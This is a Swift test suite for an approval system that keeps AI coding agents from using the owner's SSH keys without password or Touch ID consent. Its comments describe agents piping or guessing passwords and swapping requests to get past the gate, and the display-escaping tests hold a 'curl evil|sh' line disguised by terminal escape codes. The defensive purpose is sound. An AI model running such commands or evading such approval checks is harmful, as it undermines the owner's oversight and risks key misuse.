import CryptoKit
import Foundation
import XCTest
@testable import SxCore

final class TerminalApprovalPolicyTests: XCTestCase {
    func testDurations() {
        XCTAssertEqual(TerminalApproval.duration("8h"), 8 * 3600)
        XCTAssertEqual(TerminalApproval.duration("30m"), 1800)
        XCTAssertEqual(TerminalApproval.duration("1h30m"), 5400)
        XCTAssertEqual(TerminalApproval.duration("1d"), 86400)
        XCTAssertEqual(TerminalApproval.duration("24h"), TerminalApproval.maxGrant)
        XCTAssertNil(TerminalApproval.duration("25h"), "over the 24 h cap")
        XCTAssertNil(TerminalApproval.duration("2d"))
        XCTAssertNil(TerminalApproval.duration("8"), "a unit is required")
        XCTAssertNil(TerminalApproval.duration("0h"))
        XCTAssertNil(TerminalApproval.duration("30s"))
        XCTAssertNil(TerminalApproval.duration("-1h"))
        XCTAssertNil(TerminalApproval.duration("8h5"))
        XCTAssertNil(TerminalApproval.duration(""))
    }

    func testPasswordMustBeTypedAtATerminal() {
        XCTAssertNil(TerminalApproval.refusal(controllingTTY: "ttys004", stdinPath: "/dev/ttys004"))
        // Background job / agent tool without a terminal: tells the agent to hand the command over.
        let none = TerminalApproval.refusal(controllingTTY: nil, stdinPath: nil)
        XCTAssertEqual(none, TerminalApproval.noTerminal)
        XCTAssertTrue(none!.contains("give the command to the owner"))
        // `echo pw | sx approve 3` inside a terminal: stdin is a pipe.
        XCTAssertNotNil(TerminalApproval.refusal(controllingTTY: "ttys004", stdinPath: nil))
        // stdin redirected from another terminal or a file.
        XCTAssertNotNil(TerminalApproval.refusal(controllingTTY: "ttys004", stdinPath: "/dev/ttys009"))
        XCTAssertNotNil(TerminalApproval.refusal(controllingTTY: "ttys004", stdinPath: "/tmp/pw.txt"))
    }

    func fail(_ s: inout TerminalApprovalState, at t: Date) {
        s.beginAttempt(now: t)
        s.finishAttempt(ok: false, now: t)
    }

    func testLimiterBacksOffThenTurnsOff() {
        let t0 = Date(timeIntervalSince1970: 1_000_000)
        var s = TerminalApprovalState()
        XCTAssertNotNil(s.refusal(now: t0), "off until turned on with Touch ID")
        s.turnOn()
        XCTAssertNil(s.refusal(now: t0))
        for i in 0..<4 { fail(&s, at: t0.addingTimeInterval(Double(i))) }
        XCTAssertNil(s.refusal(now: t0.addingTimeInterval(5)))
        XCTAssertEqual(s.attemptsLeft(now: t0.addingTimeInterval(5)), 1)
        fail(&s, at: t0.addingTimeInterval(5))
        XCTAssertTrue(s.refusal(now: t0.addingTimeInterval(6))?.contains("try again in") == true)
        XCTAssertNil(s.refusal(now: t0.addingTimeInterval(16 * 60)), "short lock ends after 15 min")
        XCTAssertTrue(s.enabled)

        // Ten wrong passwords within a day switch terminal approvals off until Touch ID.
        for i in 0..<5 { fail(&s, at: t0.addingTimeInterval(3600 + Double(i))) }
        XCTAssertFalse(s.enabled)
        XCTAssertNotNil(s.disabledReason)
        XCTAssertTrue(s.refusal(now: t0.addingTimeInterval(7200))!.contains("Touch ID"))
        s.turnOn()
        XCTAssertNil(s.refusal(now: t0.addingTimeInterval(7200)))
        XCTAssertNil(s.disabledReason)
    }

    func testACorrectPasswordDoesNotWipeTheDailyCount() {
        let t0 = Date(timeIntervalSince1970: 2_000_000)
        var s = TerminalApprovalState(enabled: true)
        // An agent guesses between the owner's approvals: the guesses still add up and are reported.
        for round in 0..<3 {
            let base = t0.addingTimeInterval(Double(round) * 3600)
            for i in 0..<3 { fail(&s, at: base.addingTimeInterval(Double(i))) }
            s.beginAttempt(now: base.addingTimeInterval(10))
            XCTAssertEqual(s.finishAttempt(ok: true, now: base.addingTimeInterval(10)), 3, "owner is told")
        }
        XCTAssertEqual(s.failures.count, 9)
        XCTAssertEqual(s.failuresSinceSuccess(now: t0.addingTimeInterval(3 * 3600)), 0)
        fail(&s, at: t0.addingTimeInterval(3 * 3600))
        XCTAssertFalse(s.enabled, "10 in 24 h, whatever successes came between")
        // A day later the old failures no longer count.
        var later = TerminalApprovalState(enabled: true)
        for i in 0..<9 { fail(&later, at: t0.addingTimeInterval(Double(i) * 1000)) }
        fail(&later, at: t0.addingTimeInterval(30 * 3600))
        XCTAssertTrue(later.enabled)
    }

    func testAnAttemptThatNeverFinishesCounts() {
        let t0 = Date(timeIntervalSince1970: 2_500_000)
        var s = TerminalApprovalState(enabled: true)
        for i in 0..<5 { s.beginAttempt(now: t0.addingTimeInterval(Double(i))) } // e.g. Sx.app killed mid-check, each time
        XCTAssertNotNil(s.refusal(now: t0.addingTimeInterval(6)))
        s.beginAttempt(now: t0.addingTimeInterval(7))
        s.finishAttempt(ok: true, now: t0.addingTimeInterval(7))
        XCTAssertEqual(s.failures.count, 5, "only the finished attempt is cleared")
    }

    func testTurningOffKeepsItOff() {
        var s = TerminalApprovalState(enabled: true)
        s.turnOff()
        s.beginAttempt()
        s.finishAttempt(ok: true)
        XCTAssertFalse(s.enabled, "a correct password never turns approvals back on")
    }

    func testStateRoundTripsThroughWire() throws {
        var s = TerminalApprovalState(enabled: true)
        fail(&s, at: Date(timeIntervalSince1970: 3_000_000))
        XCTAssertEqual(try Wire.decode(TerminalApprovalState.self, from: Wire.encode(s)), s)
    }
}

final class GrantTableTests: XCTestCase {
    let now = Date(timeIntervalSince1970: 1_000_000)

    func info(_ until: TimeInterval) -> GrantInfo {
        GrantInfo(who: "Claude Code", scope: "ssh/k → batman", names: ["ssh/k"], until: now.addingTimeInterval(until), via: "terminal")
    }

    func testTimedGrantLastsUntilExpiry() {
        var t = GrantTable()
        t.add(key: "aaaaaaaa1111", info: info(3600))
        XCTAssertTrue(t.take("aaaaaaaa1111", now: now))
        XCTAssertTrue(t.take("aaaaaaaa1111", now: now.addingTimeInterval(3599)))
        XCTAssertFalse(t.take("aaaaaaaa1111", now: now.addingTimeInterval(3601)))
        XCTAssertFalse(t.take("aaaaaaaa1111", now: now), "expired grants are removed")
        XCTAssertFalse(t.take("other", now: now))
    }

    func testSingleUseGrantIsConsumed() {
        var t = GrantTable()
        t.add(key: "bbbbbbbb2222", info: info(900), uses: 1)
        XCTAssertEqual(t.active(now: now).first?.usesLeft, 1)
        XCTAssertTrue(t.take("bbbbbbbb2222", now: now))
        XCTAssertFalse(t.take("bbbbbbbb2222", now: now))
        XCTAssertTrue(t.active(now: now).isEmpty)
    }

    func testAddingKeepsTheWiderGrant() {
        var t = GrantTable()
        t.add(key: "eeeeeeee5555", info: info(7200), now: now)
        t.add(key: "eeeeeeee5555", info: info(600), uses: 1, now: now)
        XCTAssertEqual(t.active(now: now).first?.until, now.addingTimeInterval(7200))
        XCTAssertNil(t.active(now: now).first?.usesLeft, "unlimited stays unlimited")
        XCTAssertTrue(t.take("eeeeeeee5555", now: now))
        XCTAssertTrue(t.take("eeeeeeee5555", now: now))
    }

    func testAnExpiredGrantDoesNotMerge() {
        var t = GrantTable()
        let past = GrantInfo(who: "x", scope: "s", names: [], until: Date().addingTimeInterval(-60), via: "terminal")
        t.add(key: "gggggggg7777", info: past, uses: 1)
        let fresh = GrantInfo(who: "x", scope: "s", names: [], until: Date().addingTimeInterval(600), via: "terminal")
        t.add(key: "gggggggg7777", info: fresh, uses: 1)
        XCTAssertEqual(t.active().first?.usesLeft, 1)
    }

    func testSingleUseGrantsHaveTheirOwnKeyAndID() {
        var t = GrantTable()
        let once = GrantTable.onceKey("ffffffff6666")
        t.add(key: once, info: info(900), uses: 1)
        XCTAssertFalse(t.take("ffffffff6666", now: now), "a retry approval is not a timed grant")
        XCTAssertEqual(t.active(now: now).first?.id, "1fffffff")
        XCTAssertEqual(t.revoke(prefix: "1fff"), 1)
    }

    func testRevokeByShortIDNeedsFourCharacters() {
        var t = GrantTable()
        t.add(key: "cccccccc3333", info: info(3600))
        t.add(key: "dddddddd4444", info: info(7200))
        XCTAssertEqual(t.active(now: now).map(\.id), ["dddddddd", "cccccccc"], "longest-lived first, short ids")
        XCTAssertEqual(t.revoke(prefix: "ccc"), 0)
        XCTAssertEqual(t.revoke(prefix: "CCCCCCCC"), 1)
        XCTAssertEqual(t.active(now: now).map(\.id), ["dddddddd"])
        t.removeAll()
        XCTAssertTrue(t.active(now: now).isEmpty)
    }
}

final class PendingTableTests: XCTestCase {
    let now = Date(timeIntervalSince1970: 1_000_000)

    func info(terminal: Bool = true, prod: Bool = false) -> PendingInfo {
        PendingInfo(kind: "ssh-sign", what: "sign in with ssh/k to batman", who: "Claude Code", agent: "Claude Code",
                    chain: ["ssh", "git", "claude"], command: nil, cwd: nil, names: ["ssh/k"], host: "batman",
                    hostKey: "SHA256:x", prod: prod, terminal: terminal, canGrant: !prod)
    }

    func tok(_ t: PendingTable, _ id: Int) -> String { t.entry(id)?.info.token ?? "" }

    func testApprovalIsBoundToTheTokenNotJustTheNumber() {
        var t = PendingTable()
        let id = t.add(info(), classKey: "k", wideKey: nil, now: now)!
        let shown = t.entry(id)!.info.token
        XCTAssertFalse(shown.isEmpty)
        XCTAssertEqual(t.pick(id, token: shown, now: now), .success(.waiting))
        XCTAssertNotEqual(t.pick(id, token: "", now: now), .success(.waiting))
        // Sx.app restarts: numbering starts over, an agent makes a request that gets the same number.
        var restarted = PendingTable()
        let swapped = restarted.add(info(), classKey: "evil", wideKey: nil, now: now)!
        XCTAssertEqual(swapped, id)
        if case .success = restarted.pick(swapped, token: shown, now: now) { XCTFail("old token must not approve the new request") }
    }

    func testAFloodIsCapped() {
        var t = PendingTable()
        for i in 0..<PendingTable.maxWaiting { XCTAssertNotNil(t.add(info(), classKey: "k\(i)", wideKey: nil, now: now)) }
        XCTAssertNil(t.add(info(), classKey: "more", wideKey: nil, now: now))
        var other = info()
        other.who = "Terminal"
        XCTAssertNotNil(t.add(other, classKey: "owner", wideKey: nil, now: now), "the cap is per requester")
        XCTAssertNotNil(t.add(info(terminal: false), classKey: "delete", wideKey: nil, now: now), "Touch-ID-only is never capped")
        t.end(1, state: PendingInfo.State.expired, now: now)
        XCTAssertNotNil(t.add(info(), classKey: "again", wideKey: nil, now: now), "finished ones free a slot")
    }

    func testIdsAreSequentialAndListed() {
        var t = PendingTable()
        let a = t.add(info(), classKey: "k1", wideKey: "w1", now: now)!
        let b = t.add(info(), classKey: "k2", wideKey: nil, now: now)!
        XCTAssertEqual([a, b], [1, 2])
        XCTAssertEqual(t.list(now: now).map(\.id), [1, 2])
        XCTAssertEqual(t.list(now: now).first?.state, PendingInfo.State.waiting)
    }

    func testWaitingThenApprovedLive() {
        var t = PendingTable()
        let id = t.add(info(), classKey: "k", wideKey: nil, now: now)!
        XCTAssertEqual(t.pick(id, token: tok(t, id), now: now), .success(.waiting))
        t.approveLive(id)
        XCTAssertTrue(t.entry(id)!.approvedInTerminal)
        XCTAssertEqual(t.pick(id, token: tok(t, id), now: now), .failure(.init("#\(id): already approved")))
    }

    func testExpiredStaysApprovableForAWhile() {
        var t = PendingTable()
        let id = t.add(info(), classKey: "k", wideKey: nil, now: now)!
        t.end(id, state: PendingInfo.State.expired, now: now)
        XCTAssertEqual(t.pick(id, token: tok(t, id), now: now.addingTimeInterval(60)), .success(.expired))
        t.markApprovedAfterExpiry(id)
        if case .success = t.pick(id, token: tok(t, id), now: now.addingTimeInterval(61)) { XCTFail("approved twice") }

        let late = t.add(info(), classKey: "k2", wideKey: nil, now: now)!
        t.end(late, state: PendingInfo.State.expired, now: now)
        if case .success = t.pick(late, token: tok(t, late), now: now.addingTimeInterval(TerminalApproval.keepExpired + 1)) { XCTFail("too old") }
        t.prune(now: now.addingTimeInterval(TerminalApproval.keepExpired + 1))
        XCTAssertNil(t.entry(late))
        XCTAssertTrue(t.list(now: now.addingTimeInterval(TerminalApproval.keepExpired + 1)).isEmpty)
    }

    func testUnverifiedRequestsAreApprovableOnlyWhileTheyWait() {
        var t = PendingTable()
        var unverified = info()
        unverified.retryable = false
        let id = t.add(unverified, classKey: "once-only", wideKey: nil, now: now)!
        XCTAssertEqual(t.pick(id, token: tok(t, id), now: now), .success(.waiting))
        t.end(id, state: PendingInfo.State.expired, now: now)
        if case .success = t.pick(id, token: tok(t, id), now: now) { XCTFail("nothing its retry could match") }
    }

    func testDeniedAndTouchIDOnlyAreNotApprovable() {
        var t = PendingTable()
        let denied = t.add(info(), classKey: "k", wideKey: nil, now: now)!
        t.end(denied, state: PendingInfo.State.denied, now: now)
        XCTAssertEqual(t.pick(denied, token: tok(t, denied), now: now), .failure(.init("#\(denied): already denied")))
        let other = t.add(info(terminal: false), classKey: "k2", wideKey: nil, now: now)!
        if case .success = t.pick(other, token: tok(t, other), now: now) { XCTFail("Touch ID only") }
        if case .success = t.pick(99, token: tok(t, 99), now: now) { XCTFail("no such id") }
    }

    func testEndOnlyMovesWaitingRequests() {
        var t = PendingTable()
        let id = t.add(info(), classKey: "k", wideKey: nil, now: now)!
        t.end(id, state: PendingInfo.State.approved, now: now)
        t.end(id, state: PendingInfo.State.expired, now: now)
        XCTAssertEqual(t.entry(id)?.info.state, PendingInfo.State.approved)
    }
}

final class SSHDestinationTests: XCTestCase {
    func testHostFromArgv() {
        XCTAssertEqual(SSHDestination.host(argv: ["ssh", "batman"]), "batman")
        XCTAssertEqual(SSHDestination.host(argv: ["/usr/bin/ssh", "nv@batman", "uptime"]), "batman")
        XCTAssertEqual(SSHDestination.host(argv: ["ssh", "-p", "2222", "-o", "BatchMode=yes", "-l", "nv", "sauron", "ls"]), "sauron")
        XCTAssertEqual(SSHDestination.host(argv: ["ssh", "-4Cv", "-p2222", "gandalf"]), "gandalf")
        XCTAssertEqual(SSHDestination.host(argv: ["ssh", "-vi", "~/.ssh/k", "host"]), "host")
        // git: ssh -o SendEnv=GIT_PROTOCOL git@github.com 'git-upload-pack …'
        XCTAssertEqual(SSHDestination.host(argv: ["ssh", "-o", "SendEnv=GIT_PROTOCOL", "git@github.com", "git-upload-pack 'a/b.git'"]), "github.com")
        XCTAssertEqual(SSHDestination.host(argv: ["ssh", "ssh://git@example.com:2222/repo"]), "example.com")
        XCTAssertEqual(SSHDestination.host(argv: ["ssh", "ssh://[::1]:22"]), "::1")
        XCTAssertEqual(SSHDestination.host(argv: ["ssh", "--", "batman"]), "batman")
        XCTAssertNil(SSHDestination.host(argv: ["ssh", "-p", "22"]))
        XCTAssertNil(SSHDestination.host(argv: ["ssh-keygen", "-Y", "sign"]))
        XCTAssertNil(SSHDestination.host(argv: []))
    }
}

final class SSHHostBindingTests: XCTestCase {
    func mpint(_ b: [UInt8]) -> [UInt8] {
        var m = Array(b.drop { $0 == 0 })
        if let f = m.first, f & 0x80 != 0 { m.insert(0, at: 0) }
        return m
    }

    func bindBody(hostKey: [UInt8], sessionID: [UInt8], signature: [UInt8], forwarding: Bool = false,
                  name: String = SSHHostBinding.extensionName) -> Data {
        var w = SSHWriter()
        w.string(name)
        w.string(hostKey)
        w.string(sessionID)
        w.string(signature)
        w.byte(forwarding ? 1 : 0)
        return w.data
    }

    func ed25519Host() -> (blob: [UInt8], sign: ([UInt8]) -> [UInt8]) {
        let key = Curve25519.Signing.PrivateKey()
        var b = SSHWriter()
        b.string("ssh-ed25519")
        b.string(Array(key.publicKey.rawRepresentation))
        return (Array(b.data), { data in
            var s = SSHWriter()
            s.string("ssh-ed25519")
            s.string(Array(try! key.signature(for: Data(data))))
            return Array(s.data)
        })
    }

    func testEd25519BindingVerifies() {
        let host = ed25519Host()
        let sid = Array(SHA256.hash(data: Data("session".utf8)))
        let b = SSHHostBinding(extensionBody: bindBody(hostKey: host.blob, sessionID: sid, signature: host.sign(sid)))
        XCTAssertNotNil(b)
        XCTAssertTrue(b!.isValid)
        XCTAssertTrue(b!.hostKeyFingerprint.hasPrefix("SHA256:"))
        XCTAssertFalse(b!.isForwarding)

        // Signature over another session, or by another host key, does not verify.
        let other = Array(SHA256.hash(data: Data("other".utf8)))
        XCTAssertFalse(SSHHostBinding(extensionBody: bindBody(hostKey: host.blob, sessionID: sid, signature: host.sign(other)))!.isValid)
        let impostor = ed25519Host()
        XCTAssertFalse(SSHHostBinding(extensionBody: bindBody(hostKey: host.blob, sessionID: sid, signature: impostor.sign(sid)))!.isValid)
    }

    func testOtherExtensionsAndGarbageAreIgnored() {
        let host = ed25519Host()
        let sid: [UInt8] = [1, 2, 3]
        XCTAssertNil(SSHHostBinding(extensionBody: bindBody(hostKey: host.blob, sessionID: sid, signature: host.sign(sid), name: "query")))
        XCTAssertNil(SSHHostBinding(extensionBody: Data([0, 0, 0, 99])))
        var trailing = bindBody(hostKey: host.blob, sessionID: sid, signature: host.sign(sid))
        trailing.append(0)
        XCTAssertNil(SSHHostBinding(extensionBody: trailing))
    }

    func testECDSAHostKeys() {
        let sid = Array(SHA256.hash(data: Data("ecdsa".utf8)))
        let p256 = P256.Signing.PrivateKey()
        var blob = SSHWriter()
        blob.string("ecdsa-sha2-nistp256")
        blob.string("nistp256")
        blob.string(Array(p256.publicKey.x963Representation))
        let raw = Array(try! p256.signature(for: Data(sid)).rawRepresentation)
        var inner = SSHWriter()
        inner.string(mpint(Array(raw[0..<32])))
        inner.string(mpint(Array(raw[32..<64])))
        var sig = SSHWriter()
        sig.string("ecdsa-sha2-nistp256")
        sig.string(Array(inner.data))
        XCTAssertTrue(SSHSignatureVerifier.verify(publicKeyBlob: Array(blob.data), signatureBlob: Array(sig.data), data: Data(sid)))
        XCTAssertFalse(SSHSignatureVerifier.verify(publicKeyBlob: Array(blob.data), signatureBlob: Array(sig.data), data: Data([0])))

        let p384 = P384.Signing.PrivateKey()
        var blob384 = SSHWriter()
        blob384.string("ecdsa-sha2-nistp384")
        blob384.string("nistp384")
        blob384.string(Array(p384.publicKey.x963Representation))
        let raw384 = Array(try! p384.signature(for: Data(sid)).rawRepresentation)
        var inner384 = SSHWriter()
        inner384.string(mpint(Array(raw384[0..<48])))
        inner384.string(mpint(Array(raw384[48..<96])))
        var sig384 = SSHWriter()
        sig384.string("ecdsa-sha2-nistp384")
        sig384.string(Array(inner384.data))
        XCTAssertTrue(SSHSignatureVerifier.verify(publicKeyBlob: Array(blob384.data), signatureBlob: Array(sig384.data), data: Data(sid)))
        // Algorithm confusion: a P-256 signature name on a P-384 key.
        XCTAssertFalse(SSHSignatureVerifier.verify(publicKeyBlob: Array(blob384.data), signatureBlob: Array(sig.data), data: Data(sid)))
    }

    func testRSAAndEd25519HostKeysFromSSHKeygen() throws {
        for (type, bits, flags) in [("rsa", 2048, SSHPrivateKey.agentRSASHA512), ("rsa", 2048, SSHPrivateKey.agentRSASHA256), ("ed25519", 0, UInt32(0))] {
            let key = try SSHPrivateKey(openSSH: keygen(type, bits: bits))
            let sid = Data(SHA256.hash(data: Data(type.utf8)))
            let sig = try key.sign(sid, flags: flags)
            XCTAssertTrue(SSHSignatureVerifier.verify(publicKeyBlob: Array(key.publicBlob), signatureBlob: Array(sig), data: sid), type)
            XCTAssertFalse(SSHSignatureVerifier.verify(publicKeyBlob: Array(key.publicBlob), signatureBlob: Array(sig), data: sid + Data([1])), type)
        }
    }

    private func keygen(_ type: String, bits: Int) throws -> Data {
        let dir = FileManager.default.temporaryDirectory.appendingPathComponent("sx-hostkey-\(UUID().uuidString)")
        try FileManager.default.createDirectory(at: dir, withIntermediateDirectories: true)
        defer { try? FileManager.default.removeItem(at: dir) }
        let path = dir.appendingPathComponent("key").path
        let p = Process()
        p.executableURL = URL(fileURLWithPath: "/usr/bin/ssh-keygen")
        p.arguments = ["-q", "-t", type, "-N", "", "-C", "", "-f", path] + (bits > 0 ? ["-b", "\(bits)"] : [])
        try p.run()
        p.waitUntilExit()
        return try Data(contentsOf: URL(fileURLWithPath: path))
    }

    func userAuth(_ sid: [UInt8], method: String = "publickey", hostKey: [UInt8]? = nil) -> Data {
        var w = SSHWriter()
        w.string(sid)
        w.byte(50)
        w.string("git")
        w.string("ssh-connection")
        w.string(method)
        w.byte(1)
        w.string("ssh-ed25519")
        w.string(userKey)
        if let hostKey { w.string(hostKey) }
        return w.data
    }

    let userKey: [UInt8] = [9, 9, 9]

    func testSignRequestIsTiedToTheBoundServer() {
        let host = ed25519Host()
        let sid: [UInt8] = Array(repeating: 7, count: 32)
        let bind = SSHHostBinding(hostKey: host.blob, sessionID: sid, signature: host.sign(sid), isForwarding: false)

        XCTAssertEqual(SSHUserAuthRequest(payload: userAuth(sid))?.user, "git")
        XCTAssertEqual(SSHUserAuthRequest.boundHost(payload: userAuth(sid), bindings: [bind], key: userKey), bind)
        XCTAssertEqual(SSHUserAuthRequest.boundHost(payload: userAuth(sid, method: "publickey-hostbound-v00@openssh.com", hostKey: host.blob),
                                                    bindings: [bind], key: userKey), bind)
        // Another session, a host-bound request naming another server, a forwarded agent, no binding at all.
        XCTAssertNil(SSHUserAuthRequest.boundHost(payload: userAuth(Array(repeating: 8, count: 32)), bindings: [bind], key: userKey))
        XCTAssertNil(SSHUserAuthRequest.boundHost(payload: userAuth(sid, method: "publickey-hostbound-v00@openssh.com", hostKey: ed25519Host().blob),
                                                  bindings: [bind], key: userKey))
        let hop = SSHHostBinding(hostKey: host.blob, sessionID: sid, signature: host.sign(sid), isForwarding: true)
        XCTAssertNil(SSHUserAuthRequest.boundHost(payload: userAuth(sid), bindings: [hop, bind], key: userKey))
        XCTAssertNil(SSHUserAuthRequest.boundHost(payload: userAuth(sid), bindings: [], key: userKey))
        // A login for the bound session, but with another key than the one asked to sign.
        XCTAssertNil(SSHUserAuthRequest.boundHost(payload: userAuth(sid), bindings: [bind], key: [1, 2, 3]))
        // Not a login at all (e.g. `ssh-keygen -Y sign` data).
        XCTAssertNil(SSHUserAuthRequest(payload: Data("SSHSIG-blob".utf8)))
    }

    func testSignedDataNamespace() {
        var w = SSHWriter()
        w.string("git")
        w.string("")
        w.string("sha512")
        w.string(Array(repeating: 1, count: 64))
        XCTAssertEqual(SSHSignedData.namespace(Data("SSHSIG".utf8) + w.data), "git")
        XCTAssertNil(SSHSignedData.namespace(w.data), "no magic")
        XCTAssertNil(SSHSignedData.namespace(Data("SSHSIG".utf8) + w.data + Data([0])), "trailing bytes")
    }

    func testSHA1HostSignaturesAreRefused() throws {
        let key = try SSHPrivateKey(openSSH: keygen("rsa", bits: 2048))
        let sid = Data(SHA256.hash(data: Data("sha1".utf8)))
        XCTAssertFalse(SSHSignatureVerifier.verify(publicKeyBlob: Array(key.publicBlob), signatureBlob: Array(try key.sign(sid, flags: 0)), data: sid))
    }
}

final class ProcessInspectionTests: XCTestCase {
    func testOrcaAgentSessionsAreDetected() {
        XCTAssertEqual(AgentDetect.detect(ancestors: ["/bin/zsh", "/Applications/Orca.app/Contents/MacOS/orca-provider-exec",
                                                      "/Applications/Orca.app/Contents/MacOS/Orca"]), "Orca agent")
        XCTAssertEqual(AgentDetect.detect(ancestors: ["/bin/zsh", "/opt/homebrew/bin/claude",
                                                      "/Applications/Orca.app/Contents/MacOS/orca-provider-exec"]), "Claude Code")
        // A terminal the owner opens in Orca: login under Orca's terminal host.
        XCTAssertNil(AgentDetect.detect(ancestors: ["sx", "-/bin/zsh", "/usr/bin/login",
                                                    "/Users/nv/Library/Application Support/orca/daemon-host/macos/terminal-host-x/app.noindex/Orca Agents.app/Contents/MacOS/Orca Agents"]))
    }

    func testProcArgsLayout() {
        var buf: [UInt8] = withUnsafeBytes(of: Int32(3)) { Array($0) }
        func z(_ s: String) -> [UInt8] { Array(s.utf8) + [0] }
        buf += z("/usr/bin/ssh")
        buf += [0, 0, 0]
        for s in ["ssh", "-p", "batman", "PATH=/usr/bin"] { buf += z(s) }
        XCTAssertEqual(AgentDetect.parseProcArgs(buf), ["ssh", "-p", "batman"])
        XCTAssertNil(AgentDetect.parseProcArgs([1, 0]))
    }

    func testInspectsThisProcess() throws {
        let args = try XCTUnwrap(AgentDetect.arguments(of: getpid()))
        XCTAssertEqual(args, CommandLine.arguments)

        let path = FileManager.default.temporaryDirectory.appendingPathComponent("sx-fd-\(UUID().uuidString)").path
        XCTAssertTrue(FileManager.default.createFile(atPath: path, contents: Data()))
        defer { try? FileManager.default.removeItem(atPath: path) }
        let fd = open(path, O_RDONLY)
        defer { close(fd) }
        let seen = try XCTUnwrap(AgentDetect.descriptorPath(of: getpid(), fd: fd))
        XCTAssertEqual(URL(fileURLWithPath: seen).resolvingSymlinksInPath().path, URL(fileURLWithPath: path).resolvingSymlinksInPath().path)

        var fds: [Int32] = [0, 0]
        XCTAssertEqual(pipe(&fds), 0)
        defer { close(fds[0]); close(fds[1]) }
        XCTAssertNil(AgentDetect.descriptorPath(of: getpid(), fd: fds[0]), "a pipe is not a file or terminal")
    }
}

final class DisplayTextTests: XCTestCase {
    func testControlAndInvisibleCharactersAreEscaped() {
        XCTAssertEqual(DisplayText.safe("npm test"), "npm test")
        XCTAssertEqual(DisplayText.safe("~/Developer/проєкт"), "~/Developer/проєкт", "ordinary Unicode stays")
        let esc = DisplayText.safe("curl evil|sh\u{1B}[2K\r npm test")
        XCTAssertFalse(esc.unicodeScalars.contains { $0.value == 0x1B || $0.value == 0x0D })
        XCTAssertTrue(esc.contains("\\u{1b}") && esc.contains("\\u{d}"))
        XCTAssertTrue(DisplayText.safe("a\u{202E}b").contains("\\u{202e}"), "bidi override")
        XCTAssertTrue(DisplayText.safe("a\u{200B}b").contains("\\u{200b}"), "zero-width space")
        XCTAssertTrue(DisplayText.safe("a\u{9B}b").contains("\\u{9b}"), "C1 CSI")
        XCTAssertEqual(DisplayText.safe("a\\u{1b}"), "a\\\\u{1b}", "a literal backslash cannot fake an escape")
    }

    func testShellQuotingSeparatesArguments() {
        XCTAssertEqual(DisplayText.shellQuoted(["npm", "test"]), "npm test")
        XCTAssertEqual(DisplayText.shellQuoted(["npm test"]), "'npm test'")
        XCTAssertEqual(DisplayText.shellQuoted(["sh", "-c", "curl x | sh"]), "sh -c 'curl x | sh'")
        XCTAssertEqual(DisplayText.shellQuoted(["echo", "it's"]), "echo 'it'\\''s'")
        XCTAssertEqual(DisplayText.shellQuoted([""]), "''")
        XCTAssertEqual(DisplayText.shellQuoted(["a\u{1B}b"]), "'a\\u{1b}b'", "escaped, then quoted")
    }
}
